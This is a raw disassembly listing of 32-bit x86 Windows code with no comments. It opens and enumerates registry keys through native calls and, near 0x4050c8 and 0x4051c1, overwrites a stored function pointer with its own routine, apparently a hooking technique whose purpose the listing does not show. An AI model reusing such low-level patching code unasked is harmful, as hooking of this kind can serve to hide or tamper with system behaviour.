  404f4a:	c6 44 24 17 01       	movb   $0x1,0x17(%esp)
  404f4f:	0f 8c cb fe ff ff    	jl     0x404e20
  404f55:	eb 08                	jmp    0x404f5f
  404f57:	ff 15 14 60 40 00    	call   *0x406014
  404f5d:	33 db                	xor    %ebx,%ebx
  404f5f:	33 c0                	xor    %eax,%eax
  404f61:	38 5c 24 17          	cmp    %bl,0x17(%esp)
  404f65:	0f 95 c0             	setne  %al
  404f68:	48                   	dec    %eax
  404f69:	25 01 00 00 c0       	and    $0xc0000001,%eax
  404f6e:	5f                   	pop    %edi
  404f6f:	5e                   	pop    %esi
  404f70:	5d                   	pop    %ebp
  404f71:	5b                   	pop    %ebx
  404f72:	81 c4 ac 09 00 00    	add    $0x9ac,%esp
  404f78:	c3                   	ret
  404f79:	cc                   	int3
  404f7a:	cc                   	int3
  404f7b:	cc                   	int3
  404f7c:	cc                   	int3
  404f7d:	cc                   	int3
  404f7e:	cc                   	int3
  404f7f:	cc                   	int3
  404f80:	55                   	push   %ebp
  404f81:	8b ec                	mov    %esp,%ebp
  404f83:	83 e4 f8             	and    $0xfffffff8,%esp
  404f86:	81 ec 60 0a 00 00    	sub    $0xa60,%esp
  404f8c:	53                   	push   %ebx
  404f8d:	55                   	push   %ebp
  404f8e:	56                   	push   %esi
  404f8f:	57                   	push   %edi
  404f90:	c7 44 24 38 80 0f 05 	movl   $0xfd050f80,0x38(%esp)
  404f97:	fd 
  404f98:	c7 44 24 3c ff ff ff 	movl   $0xffffffff,0x3c(%esp)
  404f9f:	ff 
  404fa0:	e8 2b fe ff ff       	call   0x404dd0
  404fa5:	33 db                	xor    %ebx,%ebx
  404fa7:	85 c0                	test   %eax,%eax
  404fa9:	7d 1b                	jge    0x404fc6
  404fab:	eb 03                	jmp    0x404fb0
  404fad:	8d 49 00             	lea    0x0(%ecx),%ecx
  404fb0:	8d 44 24 38          	lea    0x38(%esp),%eax
  404fb4:	50                   	push   %eax
  404fb5:	53                   	push   %ebx
  404fb6:	53                   	push   %ebx
  404fb7:	ff 15 a0 60 40 00    	call   *0x4060a0
  404fbd:	e8 0e fe ff ff       	call   0x404dd0
  404fc2:	85 c0                	test   %eax,%eax
  404fc4:	7c ea                	jl     0x404fb0
  404fc6:	33 c0                	xor    %eax,%eax
  404fc8:	8d 4c 24 4c          	lea    0x4c(%esp),%ecx
  404fcc:	51                   	push   %ecx
  404fcd:	89 44 24 50          	mov    %eax,0x50(%esp)
  404fd1:	89 44 24 54          	mov    %eax,0x54(%esp)
  404fd5:	89 44 24 58          	mov    %eax,0x58(%esp)
  404fd9:	89 44 24 5c          	mov    %eax,0x5c(%esp)
  404fdd:	89 44 24 60          	mov    %eax,0x60(%esp)
  404fe1:	e8 fa f8 ff ff       	call   0x4048e0
  404fe6:	85 c0                	test   %eax,%eax
  404fe8:	0f 8c 42 03 00 00    	jl     0x405330
  404fee:	81 7c 24 54 10 27 00 	cmpl   $0x2710,0x54(%esp)
  404ff5:	00 
  404ff6:	0f 82 f6 00 00 00    	jb     0x4050f2
  404ffc:	b9 1d 00 00 00       	mov    $0x1d,%ecx
  405001:	be f0 69 40 00       	mov    $0x4069f0,%esi
  405006:	8d 7c 24 68          	lea    0x68(%esp),%edi
  40500a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40500c:	68 92 01 00 00       	push   $0x192
  405011:	8d 94 24 e2 00 00 00 	lea    0xe2(%esp),%edx
  405018:	53                   	push   %ebx
  405019:	52                   	push   %edx
  40501a:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
  40501c:	e8 5b 0a 00 00       	call   0x405a7c
  405021:	83 c4 0c             	add    $0xc,%esp
  405024:	8d 44 24 68          	lea    0x68(%esp),%eax
  405028:	50                   	push   %eax
  405029:	8d 4c 24 48          	lea    0x48(%esp),%ecx
  40502d:	51                   	push   %ecx
  40502e:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  405032:	ff 15 18 60 40 00    	call   *0x406018
  405038:	8d 44 24 20          	lea    0x20(%esp),%eax
  40503c:	50                   	push   %eax
  40503d:	68 19 00 02 00       	push   $0x20019
  405042:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  405046:	8d 54 24 4c          	lea    0x4c(%esp),%edx
  40504a:	51                   	push   %ecx
  40504b:	c7 44 24 2c 18 00 00 	movl   $0x18,0x2c(%esp)
  405052:	00 
  405053:	89 5c 24 30          	mov    %ebx,0x30(%esp)
  405057:	c7 44 24 38 40 02 00 	movl   $0x240,0x38(%esp)
  40505e:	00 
  40505f:	89 54 24 34          	mov    %edx,0x34(%esp)
  405063:	89 5c 24 3c          	mov    %ebx,0x3c(%esp)
  405067:	89 5c 24 40          	mov    %ebx,0x40(%esp)
  40506b:	ff 15 ac 60 40 00    	call   *0x4060ac
  405071:	85 c0                	test   %eax,%eax
  405073:	7c 7d                	jl     0x4050f2
  405075:	8b 44 24 10          	mov    0x10(%esp),%eax
  405079:	8b f8                	mov    %eax,%edi
  40507b:	3b c3                	cmp    %ebx,%eax
  40507d:	74 73                	je     0x4050f2
  40507f:	53                   	push   %ebx
  405080:	8d 54 24 18          	lea    0x18(%esp),%edx
  405084:	52                   	push   %edx
  405085:	53                   	push   %ebx
  405086:	53                   	push   %ebx
  405087:	68 19 00 02 00       	push   $0x20019
  40508c:	50                   	push   %eax
  40508d:	ff 15 e0 60 40 00    	call   *0x4060e0
  405093:	85 c0                	test   %eax,%eax
  405095:	7c 54                	jl     0x4050eb
  405097:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40509b:	8b 71 04             	mov    0x4(%ecx),%esi
  40509e:	ff 15 84 60 40 00    	call   *0x406084
  4050a4:	3b f3                	cmp    %ebx,%esi
  4050a6:	74 43                	je     0x4050eb
  4050a8:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  4050ac:	8b 0c 06             	mov    (%esi,%eax,1),%ecx
  4050af:	39 1d 1c 8b 40 00    	cmp    %ebx,0x408b1c
  4050b5:	75 17                	jne    0x4050ce
  4050b7:	8b 51 04             	mov    0x4(%ecx),%edx
  4050ba:	8d 41 04             	lea    0x4(%ecx),%eax
  4050bd:	a3 1c 8b 40 00       	mov    %eax,0x408b1c
  4050c2:	89 15 18 8b 40 00    	mov    %edx,0x408b18
  4050c8:	c7 00 f0 4c 40 00    	movl   $0x404cf0,(%eax)
  4050ce:	8b 54 24 50          	mov    0x50(%esp),%edx
  4050d2:	8d 44 24 18          	lea    0x18(%esp),%eax
  4050d6:	50                   	push   %eax
  4050d7:	8b 04 16             	mov    (%esi,%edx,1),%eax
  4050da:	50                   	push   %eax
  4050db:	51                   	push   %ecx
  4050dc:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  4050e0:	ff 15 18 8b 40 00    	call   *0x408b18
  4050e6:	a3 c8 9f 40 00       	mov    %eax,0x409fc8
  4050eb:	57                   	push   %edi
  4050ec:	ff 15 14 60 40 00    	call   *0x406014
  4050f2:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  4050f6:	39 1d 20 8b 40 00    	cmp    %ebx,0x408b20
  4050fc:	0f 86 35 01 00 00    	jbe    0x405237
  405102:	bd 28 8b 40 00       	mov    $0x408b28,%ebp
  405107:	55                   	push   %ebp
  405108:	8d 4c 24 64          	lea    0x64(%esp),%ecx
  40510c:	51                   	push   %ecx
  40510d:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  405111:	ff 15 18 60 40 00    	call   *0x406018
  405117:	8d 44 24 20          	lea    0x20(%esp),%eax
  40511b:	50                   	push   %eax
  40511c:	68 19 00 02 00       	push   $0x20019
  405121:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  405125:	8d 54 24 68          	lea    0x68(%esp),%edx
  405129:	51                   	push   %ecx
  40512a:	c7 44 24 2c 18 00 00 	movl   $0x18,0x2c(%esp)
  405131:	00 
  405132:	89 5c 24 30          	mov    %ebx,0x30(%esp)
  405136:	c7 44 24 38 40 02 00 	movl   $0x240,0x38(%esp)
  40513d:	00 
  40513e:	89 54 24 34          	mov    %edx,0x34(%esp)
  405142:	89 5c 24 3c          	mov    %ebx,0x3c(%esp)
  405146:	89 5c 24 40          	mov    %ebx,0x40(%esp)
  40514a:	ff 15 ac 60 40 00    	call   *0x4060ac
  405150:	85 c0                	test   %eax,%eax
  405152:	0f 8c c4 00 00 00    	jl     0x40521c
  405158:	8b 44 24 10          	mov    0x10(%esp),%eax
  40515c:	8b f8                	mov    %eax,%edi
  40515e:	3b c3                	cmp    %ebx,%eax
  405160:	0f 84 b6 00 00 00    	je     0x40521c
  405166:	53                   	push   %ebx
  405167:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  40516b:	52                   	push   %edx
  40516c:	53                   	push   %ebx
  40516d:	53                   	push   %ebx
  40516e:	68 19 00 02 00       	push   $0x20019
  405173:	50                   	push   %eax
  405174:	ff 15 e0 60 40 00    	call   *0x4060e0
  40517a:	85 c0                	test   %eax,%eax
  40517c:	0f 8c 93 00 00 00    	jl     0x405215
  405182:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  405186:	8b 71 04             	mov    0x4(%ecx),%esi
  405189:	ff 15 84 60 40 00    	call   *0x406084
  40518f:	3b f3                	cmp    %ebx,%esi
  405191:	0f 84 7e 00 00 00    	je     0x405215
  405197:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  40519b:	8b 0c 06             	mov    (%esi,%eax,1),%ecx
  40519e:	39 1d 1c 8b 40 00    	cmp    %ebx,0x408b1c
  4051a4:	75 2b                	jne    0x4051d1
  4051a6:	81 7c 24 54 10 27 00 	cmpl   $0x2710,0x54(%esp)
  4051ad:	00 
  4051ae:	8b 51 04             	mov    0x4(%ecx),%edx
  4051b1:	8d 41 04             	lea    0x4(%ecx),%eax
  4051b4:	a3 1c 8b 40 00       	mov    %eax,0x408b1c
  4051b9:	89 15 18 8b 40 00    	mov    %edx,0x408b18
  4051bf:	73 08                	jae    0x4051c9
  4051c1:	c7 00 20 4c 40 00    	movl   $0x404c20,(%eax)
  4051c7:	eb 0e                	jmp    0x4051d7
  4051c9:	c7 00 f0 4c 40 00    	movl   $0x404cf0,(%eax)
  4051cf:	eb 06                	jmp    0x4051d7
  4051d1:	8b 15 18 8b 40 00    	mov    0x408b18,%edx
  4051d7:	81 7c 24 54 10 27 00 	cmpl   $0x2710,0x54(%esp)
  4051de:	00 
  4051df:	73 0d                	jae    0x4051ee
  4051e1:	8b 44 24 50          	mov    0x50(%esp),%eax
  4051e5:	8b 04 06             	mov    (%esi,%eax,1),%eax
  4051e8:	50                   	push   %eax
  4051e9:	51                   	push   %ecx
  4051ea:	ff d2                	call   *%edx
  4051ec:	eb 14                	jmp    0x405202
  4051ee:	8d 44 24 44          	lea    0x44(%esp),%eax
  4051f2:	50                   	push   %eax
  4051f3:	8b 44 24 54          	mov    0x54(%esp),%eax
  4051f7:	8b 04 06             	mov    (%esi,%eax,1),%eax
  4051fa:	50                   	push   %eax
  4051fb:	51                   	push   %ecx
  4051fc:	89 5c 24 50          	mov    %ebx,0x50(%esp)
  405200:	ff d2                	call   *%edx
  405202:	8b 0d 24 8b 40 00    	mov    0x408b24,%ecx
  405208:	ff 05 24 8b 40 00    	incl   0x408b24
  40520e:	89 04 8d 78 9f 40 00 	mov    %eax,0x409f78(,%ecx,4)
  405215:	57                   	push   %edi
  405216:	ff 15 14 60 40 00    	call   *0x406014
  40521c:	8b 44 24 14          	mov    0x14(%esp),%eax
  405220:	40                   	inc    %eax
  405221:	81 c5 08 02 00 00    	add    $0x208,%ebp
  405227:	89 44 24 14          	mov    %eax,0x14(%esp)
  40522b:	3b 05 20 8b 40 00    	cmp    0x408b20,%eax
  405231:	0f 82 d0 fe ff ff    	jb     0x405107
  405237:	68 00 08 00 00       	push   $0x800
  40523c:	8d 94 24 74 02 00 00 	lea    0x274(%esp),%edx
  405243:	53                   	push   %ebx
  405244:	52                   	push   %edx
  405245:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  405249:	e8 2e 08 00 00       	call   0x405a7c
  40524e:	8b 35 18 60 40 00    	mov    0x406018,%esi
  405254:	83 c4 0c             	add    $0xc,%esp
  405257:	68 c0 61 40 00       	push   $0x4061c0
  40525c:	8d 44 24 64          	lea    0x64(%esp),%eax
  405260:	50                   	push   %eax
  405261:	ff d6                	call   *%esi
  405263:	8d 54 24 20          	lea    0x20(%esp),%edx
  405267:	52                   	push   %edx
  405268:	6a 01                	push   $0x1
  40526a:	8d 44 24 18          	lea    0x18(%esp),%eax
  40526e:	8d 4c 24 68          	lea    0x68(%esp),%ecx
  405272:	50                   	push   %eax
  405273:	c7 44 24 2c 18 00 00 	movl   $0x18,0x2c(%esp)
  40527a:	00 
  40527b:	89 5c 24 30          	mov    %ebx,0x30(%esp)
  40527f:	c7 44 24 38 40 00 00 	movl   $0x40,0x38(%esp)
  405286:	00 
  405287:	89 4c 24 34          	mov    %ecx,0x34(%esp)
  40528b:	89 5c 24 3c          	mov    %ebx,0x3c(%esp)
  40528f:	89 5c 24 40          	mov    %ebx,0x40(%esp)
  405293:	ff 15 ac 60 40 00    	call   *0x4060ac
  405299:	85 c0                	test   %eax,%eax
  40529b:	0f 8c 88 00 00 00    	jl     0x405329
  4052a1:	68 68 6a 40 00       	push   $0x406a68
  4052a6:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  4052aa:	51                   	push   %ecx
  4052ab:	ff d6                	call   *%esi
  4052ad:	8b 35 a4 60 40 00    	mov    0x4060a4,%esi
  4052b3:	8d 54 24 44          	lea    0x44(%esp),%edx
  4052b7:	52                   	push   %edx
  4052b8:	8b 54 24 14          	mov    0x14(%esp),%edx
  4052bc:	68 00 10 00 00       	push   $0x1000
  4052c1:	8d 84 24 78 02 00 00 	lea    0x278(%esp),%eax
  4052c8:	50                   	push   %eax
  4052c9:	6a 02                	push   $0x2
  4052cb:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  4052cf:	51                   	push   %ecx
  4052d0:	52                   	push   %edx
  4052d1:	c7 44 24 50 00 d3 ce 	movl   $0xfeced300,0x50(%esp)
  4052d8:	fe 
  4052d9:	c7 44 24 54 ff ff ff 	movl   $0xffffffff,0x54(%esp)
  4052e0:	ff 
  4052e1:	ff d6                	call   *%esi
  4052e3:	85 c0                	test   %eax,%eax
  4052e5:	7d 31                	jge    0x405318
  4052e7:	8d 44 24 38          	lea    0x38(%esp),%eax
  4052eb:	50                   	push   %eax
  4052ec:	53                   	push   %ebx
  4052ed:	53                   	push   %ebx
  4052ee:	ff 15 a0 60 40 00    	call   *0x4060a0
  4052f4:	8d 4c 24 44          	lea    0x44(%esp),%ecx
  4052f8:	51                   	push   %ecx
  4052f9:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4052fd:	68 00 10 00 00       	push   $0x1000
  405302:	8d 94 24 78 02 00 00 	lea    0x278(%esp),%edx
  405309:	52                   	push   %edx
  40530a:	6a 02                	push   $0x2
  40530c:	8d 44 24 28          	lea    0x28(%esp),%eax
  405310:	50                   	push   %eax
  405311:	51                   	push   %ecx
  405312:	ff d6                	call   *%esi
  405314:	85 c0                	test   %eax,%eax
  405316:	7c cf                	jl     0x4052e7
  405318:	8b 54 24 10          	mov    0x10(%esp),%edx
  40531c:	52                   	push   %edx
  40531d:	88 1d 04 70 40 00    	mov    %bl,0x407004
  405323:	ff 15 14 60 40 00    	call   *0x406014
  405329:	53                   	push   %ebx
  40532a:	ff 15 0c 60 40 00    	call   *0x40600c
  405330:	5f                   	pop    %edi
  405331:	5e                   	pop    %esi
  405332:	5d                   	pop    %ebp
  405333:	5b                   	pop    %ebx
  405334:	8b e5                	mov    %ebp,%esp
  405336:	5d                   	pop    %ebp
  405337:	c2 04 00             	ret    $0x4
  40533a:	cc                   	int3
  40533b:	cc                   	int3
  40533c:	cc                   	int3
  40533d:	cc                   	int3
  40533e:	cc                   	int3
  40533f:	cc                   	int3
  405340:	83 ec 40             	sub    $0x40,%esp
  405343:	53                   	push   %ebx
  405344:	55                   	push   %ebp
  405345:	56                   	push   %esi
  405346:	8b 35 18 60 40 00    	mov    0x406018,%esi
  40534c:	57                   	push   %edi
  40534d:	68 c0 61 40 00       	push   $0x4061c0
  405352:	8d 44 24 24          	lea    0x24(%esp),%eax
  405356:	33 db                	xor    %ebx,%ebx
  405358:	50                   	push   %eax
  405359:	c7 44 24 1c ff ff ff 	movl   $0xffffffff,0x1c(%esp)
  405360:	ff 
  405361:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  405365:	ff d6                	call   *%esi
  405367:	8b 4c 24 54          	mov    0x54(%esp),%ecx
  40536b:	51                   	push   %ecx
  40536c:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  405370:	52                   	push   %edx
  405371:	ff d6                	call   *%esi
  405373:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  405377:	51                   	push   %ecx
  405378:	68 1f 00 02 00       	push   $0x2001f
  40537d:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  405381:	8d 44 24 28          	lea    0x28(%esp),%eax
  405385:	52                   	push   %edx
  405386:	c7 44 24 44 18 00 00 	movl   $0x18,0x44(%esp)
  40538d:	00 
  40538e:	89 5c 24 48          	mov    %ebx,0x48(%esp)
  405392:	c7 44 24 50 40 00 00 	movl   $0x40,0x50(%esp)
  405399:	00 
  40539a:	89 44 24 4c          	mov    %eax,0x4c(%esp)
  40539e:	89 5c 24 54          	mov    %ebx,0x54(%esp)
  4053a2:	89 5c 24 58          	mov    %ebx,0x58(%esp)
  4053a6:	ff 15 ac 60 40 00    	call   *0x4060ac
  4053ac:	8b f0                	mov    %eax,%esi
  4053ae:	3b f3                	cmp    %ebx,%esi
  4053b0:	7c 5d                	jl     0x40540f
  4053b2:	8b 2d a4 60 40 00    	mov    0x4060a4,%ebp
  4053b8:	8d 44 24 10          	lea    0x10(%esp),%eax
  4053bc:	50                   	push   %eax
  4053bd:	8b 44 24 18          	mov    0x18(%esp),%eax
  4053c1:	6a 10                	push   $0x10
  4053c3:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  4053c7:	51                   	push   %ecx
  4053c8:	6a 02                	push   $0x2
  4053ca:	8d 54 24 28          	lea    0x28(%esp),%edx
  4053ce:	52                   	push   %edx
  4053cf:	50                   	push   %eax
  4053d0:	ff d5                	call   *%ebp
  4053d2:	8b f0                	mov    %eax,%esi
  4053d4:	3b f3                	cmp    %ebx,%esi
  4053d6:	7d 10                	jge    0x4053e8
  4053d8:	81 fe 05 00 00 80    	cmp    $0x80000005,%esi
  4053de:	74 08                	je     0x4053e8
  4053e0:	81 fe 23 00 00 c0    	cmp    $0xc0000023,%esi
  4053e6:	75 27                	jne    0x40540f
  4053e8:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4053ec:	51                   	push   %ecx
  4053ed:	53                   	push   %ebx
  4053ee:	ff 15 2c 60 40 00    	call   *0x40602c
  4053f4:	8b f8                	mov    %eax,%edi
  4053f6:	3b fb                	cmp    %ebx,%edi
  4053f8:	75 31                	jne    0x40542b
  4053fa:	be 9a 00 00 c0       	mov    $0xc000009a,%esi
  4053ff:	3b fb                	cmp    %ebx,%edi
  405401:	74 0c                	je     0x40540f
  405403:	53                   	push   %ebx
  405404:	57                   	push   %edi
  405405:	ff 15 28 61 40 00    	call   *0x406128
  40540b:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  40540f:	8b 44 24 14          	mov    0x14(%esp),%eax
  405413:	83 f8 ff             	cmp    $0xffffffff,%eax
  405416:	74 07                	je     0x40541f
  405418:	50                   	push   %eax
  405419:	ff 15 14 60 40 00    	call   *0x406014
  40541f:	5f                   	pop    %edi
  405420:	8b c6                	mov    %esi,%eax
  405422:	5e                   	pop    %esi
  405423:	5d                   	pop    %ebp
  405424:	5b                   	pop    %ebx
  405425:	83 c4 40             	add    $0x40,%esp
  405428:	c2 0c 00             	ret    $0xc
  40542b:	8b 44 24 10          	mov    0x10(%esp),%eax
  40542f:	8d 54 24 10          	lea    0x10(%esp),%edx
  405433:	52                   	push   %edx
  405434:	8b 54 24 18          	mov    0x18(%esp),%edx
  405438:	50                   	push   %eax
  405439:	57                   	push   %edi
  40543a:	6a 02                	push   $0x2
  40543c:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  405440:	51                   	push   %ecx
  405441:	52                   	push   %edx
  405442:	ff d5                	call   *%ebp
  405444:	8b f0                	mov    %eax,%esi
  405446:	3b f3                	cmp    %ebx,%esi
  405448:	7c b5                	jl     0x4053ff
  40544a:	8b 44 24 58          	mov    0x58(%esp),%eax
  40544e:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  405452:	8b 54 24 5c          	mov    0x5c(%esp),%edx
  405456:	89 38                	mov    %edi,(%eax)
  405458:	89 0a                	mov    %ecx,(%edx)
  40545a:	33 f6                	xor    %esi,%esi
  40545c:	eb b1                	jmp    0x40540f
  40545e:	cc                   	int3
  40545f:	cc                   	int3
  405460:	83 ec 30             	sub    $0x30,%esp
  405463:	56                   	push   %esi
  405464:	8b 35 18 60 40 00    	mov    0x406018,%esi
  40546a:	57                   	push   %edi
  40546b:	50                   	push   %eax
  40546c:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  405470:	33 ff                	xor    %edi,%edi
  405472:	51                   	push   %ecx
  405473:	89 7c 24 14          	mov    %edi,0x14(%esp)
  405477:	ff d6                	call   *%esi
  405479:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  40547d:	52                   	push   %edx
  40547e:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  405482:	50                   	push   %eax
  405483:	ff d6                	call   *%esi
  405485:	8d 54 24 20          	lea    0x20(%esp),%edx
  405489:	52                   	push   %edx
  40548a:	68 3f 00 0f 00       	push   $0xf003f
  40548f:	8d 44 24 14          	lea    0x14(%esp),%eax
  405493:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  405497:	50                   	push   %eax
  405498:	c7 44 24 2c 18 00 00 	movl   $0x18,0x2c(%esp)
  40549f:	00 
  4054a0:	89 7c 24 30          	mov    %edi,0x30(%esp)
  4054a4:	c7 44 24 38 40 00 00 	movl   $0x40,0x38(%esp)
  4054ab:	00 
  4054ac:	89 4c 24 34          	mov    %ecx,0x34(%esp)
  4054b0:	89 7c 24 3c          	mov    %edi,0x3c(%esp)
  4054b4:	89 7c 24 40          	mov    %edi,0x40(%esp)
  4054b8:	ff 15 ac 60 40 00    	call   *0x4060ac
  4054be:	8b f0                	mov    %eax,%esi
  4054c0:	3b f7                	cmp    %edi,%esi
  4054c2:	7c 18                	jl     0x4054dc
  4054c4:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4054c8:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  4054cc:	51                   	push   %ecx
  4054cd:	52                   	push   %edx
  4054ce:	ff 15 04 61 40 00    	call   *0x406104
  4054d4:	8b f0                	mov    %eax,%esi
  4054d6:	3b f7                	cmp    %edi,%esi
  4054d8:	7c 02                	jl     0x4054dc
  4054da:	33 f6                	xor    %esi,%esi
  4054dc:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4054e0:	3b c7                	cmp    %edi,%eax
  4054e2:	74 07                	je     0x4054eb
  4054e4:	50                   	push   %eax
  4054e5:	ff 15 14 60 40 00    	call   *0x406014
  4054eb:	5f                   	pop    %edi
  4054ec:	8b c6                	mov    %esi,%eax
  4054ee:	5e                   	pop    %esi
  4054ef:	83 c4 30             	add    $0x30,%esp
  4054f2:	c2 04 00             	ret    $0x4
  4054f5:	cc                   	int3
  4054f6:	cc                   	int3
  4054f7:	cc                   	int3
  4054f8:	cc                   	int3
  4054f9:	cc                   	int3
  4054fa:	cc                   	int3
  4054fb:	cc                   	int3
  4054fc:	cc                   	int3
  4054fd:	cc                   	int3
  4054fe:	cc                   	int3
  4054ff:	cc                   	int3
  405500:	81 ec 30 08 00 00    	sub    $0x830,%esp
  405506:	8b 84 24 34 08 00 00 	mov    0x834(%esp),%eax
  40550d:	53                   	push   %ebx
  40550e:	55                   	push   %ebp
  40550f:	56                   	push   %esi
  405510:	57                   	push   %edi
  405511:	50                   	push   %eax
  405512:	8d 4c 24 3c          	lea    0x3c(%esp),%ecx
  405516:	33 db                	xor    %ebx,%ebx
  405518:	51                   	push   %ecx
  405519:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  40551d:	ff 15 18 60 40 00    	call   *0x406018
  405523:	8d 44 24 20          	lea    0x20(%esp),%eax
  405527:	50                   	push   %eax
  405528:	68 3f 00 0f 00       	push   $0xf003f
  40552d:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  405531:	8d 54 24 40          	lea    0x40(%esp),%edx
  405535:	51                   	push   %ecx
  405536:	c7 44 24 2c 18 00 00 	movl   $0x18,0x2c(%esp)
  40553d:	00 
  40553e:	89 5c 24 30          	mov    %ebx,0x30(%esp)
  405542:	c7 44 24 38 40 00 00 	movl   $0x40,0x38(%esp)
  405549:	00 
  40554a:	89 54 24 34          	mov    %edx,0x34(%esp)
  40554e:	89 5c 24 3c          	mov    %ebx,0x3c(%esp)
  405552:	89 5c 24 40          	mov    %ebx,0x40(%esp)
  405556:	ff 15 ac 60 40 00    	call   *0x4060ac
  40555c:	8b f0                	mov    %eax,%esi
  40555e:	3b f3                	cmp    %ebx,%esi
  405560:	0f 8c 96 01 00 00    	jl     0x4056fc
  405566:	8b 44 24 18          	mov    0x18(%esp),%eax
  40556a:	8b 3d 10 61 40 00    	mov    0x406110,%edi
  405570:	8d 54 24 14          	lea    0x14(%esp),%edx
  405574:	52                   	push   %edx
  405575:	53                   	push   %ebx
  405576:	53                   	push   %ebx
  405577:	6a 02                	push   $0x2
  405579:	50                   	push   %eax
  40557a:	89 5c 24 28          	mov    %ebx,0x28(%esp)
  40557e:	ff d7                	call   *%edi
  405580:	8b f0                	mov    %eax,%esi
  405582:	81 fe 23 00 00 c0    	cmp    $0xc0000023,%esi
  405588:	0f 85 6e 01 00 00    	jne    0x4056fc
  40558e:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  405592:	51                   	push   %ecx
  405593:	53                   	push   %ebx
  405594:	ff 15 2c 60 40 00    	call   *0x40602c
  40559a:	8b e8                	mov    %eax,%ebp
  40559c:	89 6c 24 1c          	mov    %ebp,0x1c(%esp)
  4055a0:	3b eb                	cmp    %ebx,%ebp
  4055a2:	0f 84 54 01 00 00    	je     0x4056fc
  4055a8:	8b 44 24 14          	mov    0x14(%esp),%eax
  4055ac:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  4055b0:	8d 54 24 14          	lea    0x14(%esp),%edx
  4055b4:	52                   	push   %edx
  4055b5:	50                   	push   %eax
  4055b6:	55                   	push   %ebp
  4055b7:	6a 02                	push   $0x2
  4055b9:	51                   	push   %ecx
  4055ba:	ff d7                	call   *%edi
  4055bc:	8b f0                	mov    %eax,%esi
  4055be:	3b f3                	cmp    %ebx,%esi
  4055c0:	0f 8c 2e 01 00 00    	jl     0x4056f4
  4055c6:	8b 45 14             	mov    0x14(%ebp),%eax
  4055c9:	3b c3                	cmp    %ebx,%eax
  4055cb:	0f 86 10 01 00 00    	jbe    0x4056e1
  4055d1:	8d 68 ff             	lea    -0x1(%eax),%ebp
  4055d4:	83 fd ff             	cmp    $0xffffffff,%ebp
  4055d7:	0f 84 00 01 00 00    	je     0x4056dd
  4055dd:	8d 49 00             	lea    0x0(%ecx),%ecx
  4055e0:	8b 44 24 18          	mov    0x18(%esp),%eax
  4055e4:	8b 3d 0c 61 40 00    	mov    0x40610c,%edi
  4055ea:	8d 54 24 14          	lea    0x14(%esp),%edx
  4055ee:	52                   	push   %edx
  4055ef:	53                   	push   %ebx
  4055f0:	53                   	push   %ebx
  4055f1:	53                   	push   %ebx
  4055f2:	55                   	push   %ebp
  4055f3:	50                   	push   %eax
  4055f4:	ff d7                	call   *%edi
  4055f6:	3d 23 00 00 c0       	cmp    $0xc0000023,%eax
  4055fb:	0f 85 d2 00 00 00    	jne    0x4056d3
  405601:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  405605:	51                   	push   %ecx
  405606:	53                   	push   %ebx
  405607:	ff 15 2c 60 40 00    	call   *0x40602c
  40560d:	8b f0                	mov    %eax,%esi
  40560f:	3b f3                	cmp    %ebx,%esi
  405611:	0f 84 bc 00 00 00    	je     0x4056d3
  405617:	8b 44 24 14          	mov    0x14(%esp),%eax
  40561b:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40561f:	8d 54 24 14          	lea    0x14(%esp),%edx
  405623:	52                   	push   %edx
  405624:	50                   	push   %eax
  405625:	56                   	push   %esi
  405626:	53                   	push   %ebx
  405627:	55                   	push   %ebp
  405628:	51                   	push   %ecx
  405629:	ff d7                	call   *%edi
  40562b:	85 c0                	test   %eax,%eax
  40562d:	0f 8c 98 00 00 00    	jl     0x4056cb
  405633:	8b bc 24 44 08 00 00 	mov    0x844(%esp),%edi
  40563a:	8b c7                	mov    %edi,%eax
  40563c:	8d 50 02             	lea    0x2(%eax),%edx
  40563f:	90                   	nop
  405640:	66 8b 08             	mov    (%eax),%cx
  405643:	83 c0 02             	add    $0x2,%eax
  405646:	66 3b cb             	cmp    %bx,%cx
  405649:	75 f5                	jne    0x405640
  40564b:	2b c2                	sub    %edx,%eax
  40564d:	8b 56 0c             	mov    0xc(%esi),%edx
  405650:	d1 f8                	sar    $1,%eax
  405652:	d1 ea                	shr    $1,%edx
  405654:	8d 44 02 01          	lea    0x1(%edx,%eax,1),%eax
  405658:	3d 00 04 00 00       	cmp    $0x400,%eax
  40565d:	73 6c                	jae    0x4056cb
  40565f:	68 00 08 00 00       	push   $0x800
  405664:	8d 4c 24 44          	lea    0x44(%esp),%ecx
  405668:	53                   	push   %ebx
  405669:	51                   	push   %ecx
  40566a:	e8 0d 04 00 00       	call   0x405a7c
